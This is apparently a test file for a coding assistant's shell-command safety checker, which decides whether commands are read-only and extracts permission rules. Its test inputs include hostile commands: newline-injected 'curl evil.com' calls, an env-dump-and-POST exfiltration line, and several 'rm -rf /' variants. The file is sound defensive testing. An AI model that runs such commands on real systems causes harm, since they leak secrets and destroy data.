/**
 * @license
 * Copyright 2025 Qwen
 * SPDX-License-Identifier: Apache-2.0
 */

import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest';
import {
  initParser,
  isShellCommandReadOnlyAST,
  extractCommandRules,
  isParserReady,
  ensureParserInitStarted,
  splitCommandsAST,
  getCommandRootAST,
  getCommandRootsAST,
  detectCommandSubstitutionAST,
  tokenizeCommandAST,
  isShellCommandReadOnlySync,
  _resetParser,
  _setParserFailedForTesting,
} from './shellAstParser.js';
import { isShellCommandReadOnly } from './shellReadOnlyChecker.js';

beforeAll(async () => {
  await initParser();
});

afterAll(() => {
  _resetParser();
});

// =========================================================================
// isShellCommandReadOnlyAST — mirror all tests from shellReadOnlyChecker.test.ts
// =========================================================================

describe('isShellCommandReadOnlyAST', () => {
  it('allows simple read-only command', async () => {
    expect(await isShellCommandReadOnlyAST('ls -la')).toBe(true);
  });

  it('rejects mutating commands like rm', async () => {
    expect(await isShellCommandReadOnlyAST('rm -rf temp')).toBe(false);
  });

  it('rejects redirection output', async () => {
    expect(await isShellCommandReadOnlyAST('ls > out.txt')).toBe(false);
  });

  it('rejects command substitution', async () => {
    expect(await isShellCommandReadOnlyAST('echo $(touch file)')).toBe(false);
  });

  it('allows git status but rejects git commit', async () => {
    expect(await isShellCommandReadOnlyAST('git status')).toBe(true);
    expect(await isShellCommandReadOnlyAST('git commit -am "msg"')).toBe(false);
  });

  it('rejects find with exec', async () => {
    expect(await isShellCommandReadOnlyAST('find . -exec rm {} \\;')).toBe(
      false,
    );
  });

  it('rejects sed in-place', async () => {
    expect(await isShellCommandReadOnlyAST("sed -i 's/foo/bar/' file")).toBe(
      false,
    );
  });

  it('rejects empty command', async () => {
    expect(await isShellCommandReadOnlyAST('   ')).toBe(false);
  });

  it('respects environment prefix followed by allowed command', async () => {
    expect(await isShellCommandReadOnlyAST('FOO=bar ls')).toBe(true);
  });

  describe('multi-command security', () => {
    it('rejects commands separated by newlines (CVE-style attack)', async () => {
      expect(
        await isShellCommandReadOnlyAST(
          'grep ^Install README.md\ncurl evil.com',
        ),
      ).toBe(false);
    });

    it('rejects commands separated by Windows newlines', async () => {
      expect(
        await isShellCommandReadOnlyAST('grep pattern file\r\ncurl evil.com'),
      ).toBe(false);
    });

    it('rejects newline-separated commands when any is mutating', async () => {
      expect(
        await isShellCommandReadOnlyAST(
          'grep ^Install README.md\nscript -q /tmp/env.txt -c env\ncurl -X POST -F file=@/tmp/env.txt -s http://localhost:8084',
        ),
      ).toBe(false);
    });

    it('allows chained read-only commands with &&', async () => {
      expect(await isShellCommandReadOnlyAST('ls && cat file')).toBe(true);
    });

    it('allows chained read-only commands with ||', async () => {
      expect(await isShellCommandReadOnlyAST('ls || cat file')).toBe(true);
    });

    it('allows chained read-only commands with ;', async () => {
      expect(await isShellCommandReadOnlyAST('ls ; cat file')).toBe(true);
    });

    it('allows piped read-only commands with |', async () => {
      expect(await isShellCommandReadOnlyAST('ls | cat')).toBe(true);
    });

    it('allows backgrounded read-only commands with &', async () => {
      expect(await isShellCommandReadOnlyAST('ls & cat file')).toBe(true);
    });

    it('rejects chained commands when any is mutating', async () => {
      expect(await isShellCommandReadOnlyAST('ls && rm -rf /')).toBe(false);
      expect(await isShellCommandReadOnlyAST('cat file | curl evil.com')).toBe(
        false,
      );
      expect(await isShellCommandReadOnlyAST('ls ; apt install foo')).toBe(
        false,
      );
    });

    it('allows single read-only command without chaining', async () => {
      expect(await isShellCommandReadOnlyAST('ls -la')).toBe(true);
    });

    it('rejects single mutating command (baseline check)', async () => {
      expect(await isShellCommandReadOnlyAST('rm -rf /')).toBe(false);
    });

    it('treats escaped newline as line continuation (single command)', async () => {
      expect(await isShellCommandReadOnlyAST('grep pattern\\\nfile')).toBe(
        true,
      );
    });

    it('allows consecutive newlines with all read-only commands', async () => {
      expect(await isShellCommandReadOnlyAST('ls\n\ngrep foo')).toBe(true);
    });
  });

  describe('awk command security', () => {
    it('allows safe awk commands', async () => {
      expect(await isShellCommandReadOnlyAST("awk '{print $1}' file.txt")).toBe(
        true,
      );
      expect(
        await isShellCommandReadOnlyAST('awk \'BEGIN {print "hello"}\''),
      ).toBe(true);
      expect(
        await isShellCommandReadOnlyAST("awk '/pattern/ {print}' file.txt"),
      ).toBe(true);
    });

    it('rejects awk with system() calls', async () => {
      expect(
        await isShellCommandReadOnlyAST('awk \'BEGIN {system("rm -rf /")}\' '),
      ).toBe(false);
      expect(
        await isShellCommandReadOnlyAST(
          'awk \'{system("touch file")}\' input.txt',
        ),
      ).toBe(false);
    });

    it('rejects awk with file output redirection', async () => {
      expect(
        await isShellCommandReadOnlyAST(
          'awk \'{print > "output.txt"}\' input.txt',
        ),
      ).toBe(false);
      expect(
        await isShellCommandReadOnlyAST(
          'awk \'{printf "%s\\n", $0 > "file.txt"}\'',
        ),
      ).toBe(false);
      expect(
        await isShellCommandReadOnlyAST(
          'awk \'{print >> "append.txt"}\' input.txt',
        ),
      ).toBe(false);
    });

    it('rejects awk with command pipes', async () => {
      expect(
        await isShellCommandReadOnlyAST('awk \'{print | "sort"}\' input.txt'),
      ).toBe(false);
    });

    it('rejects awk with getline from commands', async () => {
      expect(
        await isShellCommandReadOnlyAST('awk \'BEGIN {getline < "date"}\''),
      ).toBe(false);
      expect(
        await isShellCommandReadOnlyAST('awk \'BEGIN {"date" | getline}\''),
      ).toBe(false);
    });

    it('rejects awk with close() calls', async () => {
      expect(
        await isShellCommandReadOnlyAST('awk \'BEGIN {close("file")}\''),
      ).toBe(false);
    });
  });

  describe('sed command security', () => {
    it('allows safe sed commands', async () => {
      expect(await isShellCommandReadOnlyAST("sed 's/foo/bar/' file.txt")).toBe(
        true,
      );
      expect(await isShellCommandReadOnlyAST("sed -n '1,5p' file.txt")).toBe(
        true,
      );
      expect(await isShellCommandReadOnlyAST("sed '/pattern/d' file.txt")).toBe(
        true,
      );
    });

    it('rejects sed with execute command', async () => {
      expect(
        await isShellCommandReadOnlyAST("sed 's/foo/bar/e' file.txt"),
      ).toBe(false);
    });

    it('rejects sed with write command', async () => {
      expect(
        await isShellCommandReadOnlyAST(
          "sed 's/foo/bar/w output.txt' file.txt",
        ),
      ).toBe(false);
    });

    it('rejects sed with read command', async () => {
      expect(
        await isShellCommandReadOnlyAST("sed 's/foo/bar/r input.txt' file.txt"),
      ).toBe(false);
    });

    it('still rejects sed in-place editing', async () => {
      expect(
        await isShellCommandReadOnlyAST("sed -i 's/foo/bar/' file.txt"),
      ).toBe(false);
      expect(
        await isShellCommandReadOnlyAST("sed --in-place 's/foo/bar/' file.txt"),
      ).toBe(false);
    });
  });

  // =======================================================================
  // Additional AST-specific edge cases
  // =======================================================================

  describe('AST-specific edge cases', () => {
    it('rejects backtick command substitution', async () => {
      expect(await isShellCommandReadOnlyAST('echo `rm -rf /`')).toBe(false);
    });

    it('rejects process substitution with write', async () => {
      // process_substitution is conservatively handled as command_substitution
      expect(await isShellCommandReadOnlyAST('diff <(ls) <(ls -a)')).toBe(
        false,
      );
    });

    it('allows pure variable assignment', async () => {
      expect(await isShellCommandReadOnlyAST('FOO=bar')).toBe(true);
    });

    it('allows multiple env vars before command', async () => {
      expect(await isShellCommandReadOnlyAST('A=1 B=2 ls -la')).toBe(true);
    });

    it('rejects function definitions', async () => {
      expect(await isShellCommandReadOnlyAST('foo() { rm -rf /; }')).toBe(
        false,
      );
    });

    it('allows git diff', async () => {
      expect(
        await isShellCommandReadOnlyAST(
          'git diff --word-diff=color -- file.txt',
        ),
      ).toBe(true);
    });

    it('allows git log', async () => {
      expect(await isShellCommandReadOnlyAST('git log --oneline -10')).toBe(
        true,
      );
    });

    it('rejects git push', async () => {
      expect(await isShellCommandReadOnlyAST('git push origin main')).toBe(
        false,
      );
    });

    it('allows git --version / --help', async () => {
      expect(await isShellCommandReadOnlyAST('git --version')).toBe(true);
      expect(await isShellCommandReadOnlyAST('git --help')).toBe(true);
    });

    it('allows input redirection (read-only)', async () => {
      expect(await isShellCommandReadOnlyAST('cat < input.txt')).toBe(true);
    });

    it('rejects append redirection', async () => {
      expect(await isShellCommandReadOnlyAST('echo hello >> out.txt')).toBe(
        false,
      );
    });

    it('allows here-string', async () => {
      expect(await isShellCommandReadOnlyAST('cat <<< "hello"')).toBe(true);
    });

    it('rejects nested command substitution', async () => {
      expect(await isShellCommandReadOnlyAST('echo $(echo $(rm foo))')).toBe(
        false,
      );
    });

    it('allows complex pipeline of read-only commands', async () => {
      expect(
        await isShellCommandReadOnlyAST(
          'find . -name "*.ts" | grep -v node_modules | sort | head -20',
        ),
      ).toBe(true);
    });

    it('rejects pipeline with mutating command', async () => {
      expect(
        await isShellCommandReadOnlyAST('find . -name "*.ts" | xargs rm'),
      ).toBe(false);
    });

    it('allows git branch (no mutating flags)', async () => {
      expect(await isShellCommandReadOnlyAST('git branch')).toBe(true);
      expect(await isShellCommandReadOnlyAST('git branch -a')).toBe(true);
    });

    it('rejects git branch -d', async () => {
      expect(await isShellCommandReadOnlyAST('git branch -d feature')).toBe(
        false,
      );
    });

    it('allows git remote (no mutating action)', async () => {
      expect(await isShellCommandReadOnlyAST('git remote -v')).toBe(true);
    });

    it('rejects git remote add', async () => {
      expect(await isShellCommandReadOnlyAST('git remote add origin url')).toBe(
        false,
      );
    });
  });
});

// =========================================================================
// extractCommandRules
// =========================================================================

describe('extractCommandRules', () => {
  describe('simple commands', () => {
    it('extracts root + known subcommand + wildcard', async () => {
      expect(
        await extractCommandRules('git clone https://github.com/foo/bar.git'),
      ).toEqual(['git clone *']);
    });

    it('extracts npm install with wildcard', async () => {
      expect(await extractCommandRules('npm install express')).toEqual([
        'npm install *',
      ]);
    });

    it('extracts npm outdated without wildcard (no extra args)', async () => {
      expect(await extractCommandRules('npm outdated')).toEqual([
        'npm outdated',
      ]);
    });

    it('extracts cat with wildcard', async () => {
      expect(await extractCommandRules('cat /etc/passwd')).toEqual(['cat *']);
    });

    it('extracts ls with wildcard', async () => {
      expect(await extractCommandRules('ls -la /tmp')).toEqual(['ls *']);
    });

    it('extracts bare command without args', async () => {
      expect(await extractCommandRules('whoami')).toEqual(['whoami']);
    });

    it('extracts unknown command with wildcard', async () => {
      expect(await extractCommandRules('curl https://example.com')).toEqual([
        'curl *',
      ]);
    });

    it('extracts command with only flags', async () => {
      expect(await extractCommandRules('ls -la')).toEqual(['ls *']);
    });
  });

  describe('compound commands', () => {
    it('extracts rules from && compound', async () => {
      expect(await extractCommandRules('git clone foo && npm install')).toEqual(
        ['git clone *', 'npm install'],
      );
    });

    it('extracts rules from || compound', async () => {
      expect(await extractCommandRules('git pull || git fetch origin')).toEqual(
        ['git pull', 'git fetch *'],
      );
    });

    it('extracts rules from ; compound', async () => {
      expect(await extractCommandRules('ls ; cat file')).toEqual([
        'ls',
        'cat *',
      ]);
    });

    it('extracts rules from pipeline', async () => {
      expect(await extractCommandRules('cat file | grep pattern')).toEqual([
        'cat *',
        'grep *',
      ]);
    });

    it('deduplicates rules', async () => {
      expect(
        await extractCommandRules('npm install foo && npm install bar'),
      ).toEqual(['npm install *']);
    });
  });

  describe('docker multi-level subcommands', () => {
    it('extracts docker compose up with args', async () => {
      expect(await extractCommandRules('docker compose up -d')).toEqual([
        'docker compose up *',
      ]);
    });

    it('extracts docker compose up without args', async () => {
      expect(await extractCommandRules('docker compose up')).toEqual([
        'docker compose up',
      ]);
    });

    it('extracts docker run with wildcard', async () => {
      expect(await extractCommandRules('docker run -it ubuntu bash')).toEqual([
        'docker run *',
      ]);
    });
  });

  describe('edge cases', () => {
    it('returns empty for empty string', async () => {
      expect(await extractCommandRules('')).toEqual([]);
    });

    it('returns empty for whitespace', async () => {
      expect(await extractCommandRules('   ')).toEqual([]);
    });

    it('handles env var prefix', async () => {
      expect(await extractCommandRules('FOO=bar npm install')).toEqual([
        'npm install',
      ]);
    });

    it('handles redirected command', async () => {
      expect(await extractCommandRules('echo hello > out.txt')).toEqual([
        'echo *',
      ]);
    });

    it('handles pure variable assignment (no rule)', async () => {
      expect(await extractCommandRules('FOO=bar')).toEqual([]);
    });

    it('extracts cargo subcommands', async () => {
      expect(await extractCommandRules('cargo build --release')).toEqual([
        'cargo build *',
      ]);
    });

    it('extracts kubectl subcommands', async () => {
      expect(await extractCommandRules('kubectl get pods -n default')).toEqual([
        'kubectl get *',
      ]);
    });

    it('extracts pip install', async () => {
      expect(await extractCommandRules('pip install requests')).toEqual([
        'pip install *',
      ]);
    });

    it('extracts pnpm subcommands', async () => {
      expect(await extractCommandRules('pnpm add -D typescript')).toEqual([
        'pnpm add *',
      ]);
    });
  });
});

// =========================================================================
// isParserReady / ensureParserInitStarted
// =========================================================================

describe('isParserReady', () => {
  it('returns true when parser is initialised', () => {
    expect(isParserReady()).toBe(true);
  });
});

describe('ensureParserInitStarted', () => {
  it('is safe to call multiple times when already initialised', () => {
    // Should not throw
    ensureParserInitStarted();
    ensureParserInitStarted();
    ensureParserInitStarted();
    expect(isParserReady()).toBe(true);
  });
});

// =========================================================================
// splitCommandsAST — parser ready
// =========================================================================

describe('splitCommandsAST', () => {
  it('splits && compound command', () => {
    expect(splitCommandsAST('ls && echo hello')).toEqual(['ls', 'echo hello']);
  });

  it('splits || compound command', () => {
    expect(splitCommandsAST('ls || cat file')).toEqual(['ls', 'cat file']);
  });

  it('splits ; compound command', () => {
    expect(splitCommandsAST('ls ; cat file')).toEqual(['ls', 'cat file']);
  });

  it('splits pipeline', () => {
    const result = splitCommandsAST('cat file | grep pattern | sort');
    expect(result).toEqual(['cat file', 'grep pattern', 'sort']);
  });

  it('returns single command as-is', () => {
    expect(splitCommandsAST('ls -la /tmp')).toEqual(['ls -la /tmp']);
  });

  it('handles quoted strings with operators inside', () => {
    expect(splitCommandsAST('echo "a && b" && ls')).toEqual([
      'echo "a && b"',
      'ls',
    ]);
  });

  it('handles empty input', () => {
    expect(splitCommandsAST('')).toEqual([]);
  });

  it('handles complex compound', () => {
    const result = splitCommandsAST('git status && npm test || echo fail ; ls');
    expect(result).toEqual(['git status', 'npm test', 'echo fail', 'ls']);
  });
});

// =========================================================================
// getCommandRootAST / getCommandRootsAST — parser ready
// =========================================================================

describe('getCommandRootAST', () => {
  it('extracts simple command name', () => {
    expect(getCommandRootAST('ls -la /tmp')).toBe('ls');
  });

  it('extracts command from compound (first command)', () => {
    expect(getCommandRootAST('git status && npm test')).toBe('git');
  });

  it('returns basename for paths', () => {
    expect(getCommandRootAST('/usr/bin/grep foo bar')).toBe('grep');
  });

  it('returns undefined for empty command', () => {
    expect(getCommandRootAST('')).toBeUndefined();
  });

  it('returns undefined for whitespace', () => {
    expect(getCommandRootAST('   ')).toBeUndefined();
  });

  it('handles quoted command (preserves quotes from AST node text)', () => {
    // tree-sitter returns the raw node text including quotes
    expect(getCommandRootAST('"my-cmd" arg1')).toBe('"my-cmd"');
  });
});

describe('getCommandRootsAST', () => {
  it('extracts roots from compound command', () => {
    expect(getCommandRootsAST('ls -la && cat file || echo hi')).toEqual([
      'ls',
      'cat',
      'echo',
    ]);
  });

  it('extracts roots from pipeline', () => {
    expect(getCommandRootsAST('cat file | grep pattern | sort')).toEqual([
      'cat',
      'grep',
      'sort',
    ]);
  });

  it('returns empty for empty command', () => {
    expect(getCommandRootsAST('')).toEqual([]);
  });
});

// =========================================================================
// detectCommandSubstitutionAST — parser ready
// =========================================================================

describe('detectCommandSubstitutionAST', () => {
  it('detects $() command substitution', () => {
    expect(detectCommandSubstitutionAST('echo $(ls)')).toBe(true);
  });

  it('detects backtick command substitution', () => {
    expect(detectCommandSubstitutionAST('echo `ls`')).toBe(true);
  });

  it('detects <() process substitution', () => {
    expect(detectCommandSubstitutionAST('diff <(ls) <(ls -a)')).toBe(true);
  });

  it('returns false for simple command', () => {
    expect(detectCommandSubstitutionAST('ls -la')).toBe(false);
  });

  it('ignores substitution-like text in single quotes', () => {
    expect(detectCommandSubstitutionAST("echo '$(pwd)'")).toBe(false);
  });

  it('detects nested substitution', () => {
    expect(detectCommandSubstitutionAST('echo $(echo $(ls))')).toBe(true);
  });
});

// =========================================================================
// tokenizeCommandAST — parser ready
// =========================================================================

describe('tokenizeCommandAST', () => {
  it('tokenizes simple command', () => {
    const result = tokenizeCommandAST('cat /etc/passwd');
    expect(result).not.toBeNull();
    expect(result!.commandName).toBe('cat');
    expect(result!.args).toEqual(['/etc/passwd']);
    expect(result!.redirectReads).toEqual([]);
    expect(result!.redirectWrites).toEqual([]);
  });

  it('tokenizes command with flags', () => {
    const result = tokenizeCommandAST('grep -rn pattern /src');
    expect(result).not.toBeNull();
    expect(result!.commandName).toBe('grep');
    expect(result!.args).toContain('-rn');
    expect(result!.args).toContain('pattern');
    expect(result!.args).toContain('/src');
  });

  it('extracts write redirect', () => {
    const result = tokenizeCommandAST('echo hello > /tmp/out.txt');
    expect(result).not.toBeNull();
    expect(result!.commandName).toBe('echo');
    expect(result!.args).toContain('hello');
    expect(result!.redirectWrites).toContain('/tmp/out.txt');
  });

  it('extracts read redirect', () => {
    const result = tokenizeCommandAST('sort < /tmp/data.txt');
    expect(result).not.toBeNull();
    expect(result!.commandName).toBe('sort');
    expect(result!.redirectReads).toContain('/tmp/data.txt');
  });

  it('extracts append redirect as write', () => {
    const result = tokenizeCommandAST('echo log >> /var/log/app.log');
    expect(result).not.toBeNull();
    expect(result!.redirectWrites).toContain('/var/log/app.log');
  });

  it('strips outer quotes from args', () => {
    const result = tokenizeCommandAST("cat '/etc/my file.conf'");
    expect(result).not.toBeNull();
    expect(result!.args).toContain('/etc/my file.conf');
  });

  it('returns null for empty input', () => {
    expect(tokenizeCommandAST('')).toBeNull();
    expect(tokenizeCommandAST('   ')).toBeNull();
  });

  it('returns null for compound command (not a simple command)', () => {
    const result = tokenizeCommandAST('ls && echo hello');
    expect(result).toBeNull();
  });
});

// =========================================================================
// isShellCommandReadOnlySync — parser ready
// =========================================================================

describe('isShellCommandReadOnlySync', () => {
  it('allows simple read-only command', () => {
    expect(isShellCommandReadOnlySync('ls -la')).toBe(true);
  });

  it('rejects mutating commands', () => {
    expect(isShellCommandReadOnlySync('rm -rf temp')).toBe(false);
  });

  it('rejects write redirection', () => {
    expect(isShellCommandReadOnlySync('ls > out.txt')).toBe(false);
  });

  it('allows read-only pipeline', () => {
    expect(isShellCommandReadOnlySync('cat file | grep pattern | sort')).toBe(
      true,
    );
  });

  it('rejects command substitution', () => {
    expect(isShellCommandReadOnlySync('echo $(rm file)')).toBe(false);
  });

  it('allows git status', () => {
    expect(isShellCommandReadOnlySync('git status')).toBe(true);
  });

  it('rejects git push', () => {
    expect(isShellCommandReadOnlySync('git push origin main')).toBe(false);
  });

  it('handles empty/whitespace', () => {
    expect(isShellCommandReadOnlySync('')).toBe(false);
    expect(isShellCommandReadOnlySync('   ')).toBe(false);
  });

  it('agrees with async isShellCommandReadOnlyAST', async () => {
    const testCases = [
      'ls -la',
      'cat /etc/passwd',
      'git status && ls',
      'rm -rf /',
      'echo $(whoami)',
      'git push origin main',
      'find . -name "*.ts" | grep -v node_modules',
    ];
    for (const cmd of testCases) {
      const syncResult = isShellCommandReadOnlySync(cmd);
      const asyncResult = await isShellCommandReadOnlyAST(cmd);
      expect(syncResult).toBe(asyncResult);
    }
  });
});

// =========================================================================
// Note: "parser not ready" tests (sync functions returning null) are omitted
// because _resetParser() + re-initialisation within the same WASM process is
// unreliable.  The null-return code paths are trivial guards
// (`if (!parserInstance) { ensureParserInitStarted(); return null; }`).
// =========================================================================

// =========================================================================
// Fallback: isShellCommandReadOnlyAST falls back to regex when WASM fails
// =========================================================================

describe('isShellCommandReadOnlyAST fallback to regex-based checker', () => {
  afterEach(() => {
    _resetParser();
  });

  it('returns the regex-based result for a read-only command when parser is marked failed', async () => {
    _setParserFailedForTesting();
    // Both implementations agree: ls is read-only
    expect(await isShellCommandReadOnlyAST('ls -la')).toBe(true);
  });

  it('returns the regex-based result for a mutating command when parser is marked failed', async () => {
    _setParserFailedForTesting();
    expect(await isShellCommandReadOnlyAST('rm -rf /')).toBe(false);
  });

  it('returns regex result for piped read-only commands when parser is marked failed', async () => {
    _setParserFailedForTesting();
    expect(await isShellCommandReadOnlyAST('ls | grep foo')).toBe(true);
  });

  it('returns regex result for write-redirection command when parser is marked failed', async () => {
    _setParserFailedForTesting();
    expect(await isShellCommandReadOnlyAST('echo hello > out.txt')).toBe(false);
  });

  it('fallback result matches direct regex call', async () => {
    _setParserFailedForTesting();
    const commands = [
      'ls -la',
      'rm -rf /',
      'git status',
      'git push origin main',
      'cat file | grep pattern',
      'echo hello > out.txt',
      'find . -name "*.ts"',
      'find . -exec rm {} \\;',
      "sed -i 's/a/b/' file",
      'FOO=bar ls',
    ];
    for (const cmd of commands) {
      expect(await isShellCommandReadOnlyAST(cmd)).toBe(
        isShellCommandReadOnly(cmd),
      );
    }
  });

  it('re-initialises normally after _resetParser', async () => {
    _setParserFailedForTesting();
    _resetParser();
    await initParser(); // should succeed
    // After reset, AST parser is used again
    expect(await isShellCommandReadOnlyAST('ls -la')).toBe(true);
    expect(await isShellCommandReadOnlyAST('rm -rf /')).toBe(false);
  });
});

// =========================================================================
// Consistency: isShellCommandReadOnly vs isShellCommandReadOnlyAST
//
// Both implementations must agree on all cases in this suite.
// Cases where a known, intentional divergence exists are labelled with
// [divergence] and include an explanation.
// =========================================================================

describe('consistency: isShellCommandReadOnly (regex) vs isShellCommandReadOnlyAST (AST)', () => {
  // Pairs of [command, expected] where BOTH implementations must return the
  // same result. Drawn from shellReadOnlyChecker.test.ts plus extra cases.
  const sharedCases: Array<[cmd: string, expected: boolean, note?: string]> = [
    // --- basics ---
    ['ls -la', true],
    ['rm -rf temp', false],
    ['ls > out.txt', false],
    ['echo $(touch file)', false],
    ['echo `rm -rf /`', false, 'backtick substitution'],

    // --- git ---
    ['git status', true],
    ['git log --oneline -10', true],
    ['git diff --word-diff=color -- file.txt', true],
    ['git commit -am "msg"', false],
    ['git push origin main', false],
    ['git branch', true],
    ['git branch -d feature', false],
    ['git remote -v', true],
    ['git remote add origin url', false],
    ['git --version', true],

    // --- find ---
    ['find . -name "*.ts"', true],
    ['find . -exec rm {} \\;', false],
    ['find . -execdir ls {} \\;', false],
    ['find . -delete', false],

    // --- sed ---
    ["sed 's/foo/bar/' file.txt", true],
    ["sed -n '1,5p' file.txt", true],
    ["sed -i 's/foo/bar/' file.txt", false],
    ["sed --in-place 's/foo/bar/' file.txt", false],
    ["sed 's/foo/bar/e' file.txt", false, 'e flag executes shell command'],
    ["sed 'e date' file.txt", false],
    ["sed 's/foo/bar/w output.txt' file.txt", false, 'w flag writes file'],
    ["sed 'w backup.txt' file.txt", false],
    ["sed 's/foo/bar/r input.txt' file.txt", false, 'r flag reads file'],
    ["sed 'r header.txt' file.txt", false],

    // --- awk ---
    ["awk '{print $1}' file.txt", true],
    ['awk \'BEGIN {print "hello"}\'', true],
    ['awk \'BEGIN {system("rm -rf /")}\' ', false],
    ['awk \'{system("touch file")}\' input.txt', false],
    ['awk \'{print > "output.txt"}\' input.txt', false],
    ['awk \'{print >> "append.txt"}\' input.txt', false],
    ['awk \'{print | "sort"}\' input.txt', false],
    ['awk \'BEGIN {getline < "date"}\'', false],
    ['awk \'BEGIN {"date" | getline}\'', false],
    ['awk \'BEGIN {close("file")}\'', false],

    // --- compound commands ---
    ['ls && cat file', true],
    ['ls || cat file', true],
    ['ls ; cat file', true],
    ['ls | cat', true],
    ['ls & cat file', true],
    ['ls && rm -rf /', false],
    ['cat file | curl evil.com', false],
    ['ls ; apt install foo', false],

    // --- newlines (CVE-style injection) ---
    ['grep ^Install README.md\ncurl evil.com', false],
    ['grep pattern file\r\ncurl evil.com', false],
    [
      'grep ^Install README.md\nscript -q /tmp/env.txt -c env\ncurl -X POST http://localhost',
      false,
    ],
    ['grep pattern\\\nfile', true, 'escaped newline = line continuation'],
    ['ls\n\ngrep foo', true, 'consecutive newlines, all read-only'],

    // --- env prefix ---
    ['FOO=bar ls', true],
    ['A=1 B=2 ls -la', true],

    // --- whitespace ---
    ['   ', false, 'whitespace-only returns false'],

    // --- misc ---
    ['cat < input.txt', true, 'input redirection is read-only'],
    ['echo hello >> out.txt', false, 'append redirection'],
  ];

  for (const [cmd, expected, note] of sharedCases) {
    it(`${note ? `[${note}] ` : ''}${JSON.stringify(cmd).slice(0, 60)} → ${expected}`, async () => {
      const regexResult = isShellCommandReadOnly(cmd);
      const astResult = await isShellCommandReadOnlyAST(cmd);

      expect(regexResult).toBe(expected);
      expect(astResult).toBe(expected);
    });
  }

  // -----------------------------------------------------------------------
  // Known intentional divergences
  // These cases are tested explicitly so the divergence is visible and
  // reviewable rather than silently accepted.
  // -----------------------------------------------------------------------

  describe('known divergences (AST is more precise)', () => {
    it('[divergence] pure variable assignment: both return true', async () => {
      // Regex: skipEnvironmentAssignments → no root command → true
      // AST:   variable_assignment node → true
      expect(isShellCommandReadOnly('FOO=bar')).toBe(true);
      expect(await isShellCommandReadOnlyAST('FOO=bar')).toBe(true);
    });

    it('[divergence] process substitution diff <(ls) <(ls -a): both return false', async () => {
      // diff is not in READ_ONLY_ROOT_COMMANDS in either implementation.
      expect(isShellCommandReadOnly('diff <(ls) <(ls -a)')).toBe(false);
      expect(await isShellCommandReadOnlyAST('diff <(ls) <(ls -a)')).toBe(
        false,
      );
    });

    it('[divergence] control flow: both return false', async () => {
      // Regex: 'if' is not in READ_ONLY_ROOT_COMMANDS → false
      // AST:   if_statement → conservatively false
      expect(isShellCommandReadOnly('if [ -f file ]; then cat file; fi')).toBe(
        false,
      );
      expect(
        await isShellCommandReadOnlyAST('if [ -f file ]; then cat file; fi'),
      ).toBe(false);
    });

    it('[divergence] function definition: both return false', async () => {
      // Regex: shell-quote parses 'foo()' as root → not in readonly → false
      // AST:   function_definition → false
      expect(isShellCommandReadOnly('foo() { rm -rf /; }')).toBe(false);
      expect(await isShellCommandReadOnlyAST('foo() { rm -rf /; }')).toBe(
        false,
      );
    });
  });
});
